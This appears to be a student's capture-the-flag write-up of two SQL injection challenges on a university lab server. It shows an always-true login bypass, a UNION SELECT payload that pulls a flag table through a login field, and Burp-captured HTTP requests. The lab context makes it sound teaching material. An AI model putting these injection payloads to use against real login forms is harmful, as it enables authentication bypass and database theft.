---
tags:
  - offsec
---
_by Vaughn Valle_
### SQL-1 (Input Sanitization)
When visiting the given URL in the browser, we're greeted with this.
![[Pasted image 20241203172510.png]]

![[Pasted image 20241203172527.png]]

If we input `user: test, pass: test`, we get a failed login message
 ![[Pasted image 20241203172702.png]]

The first thing to check if a page sanitizes its inputs is to do the classic `always-true` payload. 

Here I'm using `1=1`, since this is always true
![[Pasted image 20241203172539.png]]
Logging in gives us the flag.

### SQL-3 (Manual Injection)
When visiting the URL, we get this page
![[Pasted image 20241203174240.png]]

Interestingly, this is the only challenge that has registration enabled. Let's try it out
![[Pasted image 20241203174326.png]]
Logging in, we see
![[Pasted image 20241203174352.png]]

I want to analyze the requests being made during registration and login. I'll use Burp Suite for this.

![[Pasted image 20241203174731.png]]

Here are the POST request and response for `/register`
```http
GET /register HTTP/1.1
Host: offsec-chalbroker.osiris.cyber.nyu.edu:1506
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://offsec-chalbroker.osiris.cyber.nyu.edu:1506/?
Accept-Encoding: gzip, deflate, br
Cookie: CHALBROKER_USER_ID=vqv9731
Connection: keep-alive


```

```http
HTTP/1.1 200 OK
Server: gunicorn
Date: Tue, 03 Dec 2024 20:29:52 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 1202

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register</title>
    <link rel="stylesheet" href="/static/styles.css">
</head>

<body>
    <div class="container">
        <h1>Register</h1>
        <form method="post" action="/register">
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="form-group">
                <label for="description">Description:</label>
                <input type="text" id="description" name="description" required>
            </div>
            <div class="form-group">
                <label for="hobby">Hobby:</label>
                <input type="text" id="hobby" name="hobby" required>
            </div>
            <button type="submit" class="btn">Register</button>
        </form>
    </div>
</body>

</html>
```

And here is the POST request and response for `/login`
```http
POST /login HTTP/1.1
Host: offsec-chalbroker.osiris.cyber.nyu.edu:1506
Content-Length: 31
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://offsec-chalbroker.osiris.cyber.nyu.edu:1506
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://offsec-chalbroker.osiris.cyber.nyu.edu:1506/login
Accept-Encoding: gzip, deflate, br
Cookie: CHALBROKER_USER_ID=vqv9731
Connection: keep-alive

username=vaughn&password=vaughn
```

```http
HTTP/1.1 200 OK
Server: gunicorn
Date: Tue, 03 Dec 2024 20:30:12 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 509
Vary: Cookie
Set-Cookie: session=eyJ1c2VybmFtZSI6InZhdWdobiJ9.Z09qVA.M3jTCsHmFCL0sK3lp-VuITa3w74; HttpOnly; Path=/

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Profile</title>
    <link rel="stylesheet" href="/static/styles.css">
</head>

<body>
    <div class="container">
        <!-- <h1>Profile</h1> -->
        <h1>Welcome, vaughn</h1>
        <p><strong>Description:</strong> vaughn</p>
        <p><strong>Hobby:</strong> vaughn</p>
        <a href="/logout" class="btn">Logout</a>
    </div>
</body>

</html>
```

From the login response, we can see that our inputs get rendered on to the page
![[Pasted image 20241203174833.png]]

Maybe if we can exploit `/login` and use it to display the flag instead? The challenge description says that there exists a `flag` table on the SQL database. Hence our necessary query would merely be
```sql
SELECT flag FROM flag
```

We can append this to the username login page via padding the other fields required from registration page.
```sql
'UNION SELECT 1,flag,3,3,7 FROM flag--
```

Hence our POST request will look like
```http
...
...
username='UNION%20SELECT%201%2cflag%2c3%2c3%2c7%20FROM%20flag--&password=vaughn
```
which is the URL encoded string of the command above
![[Pasted image 20241203175240.png]]

Sending this gives us the flag
![[Pasted image 20241203175309.png]]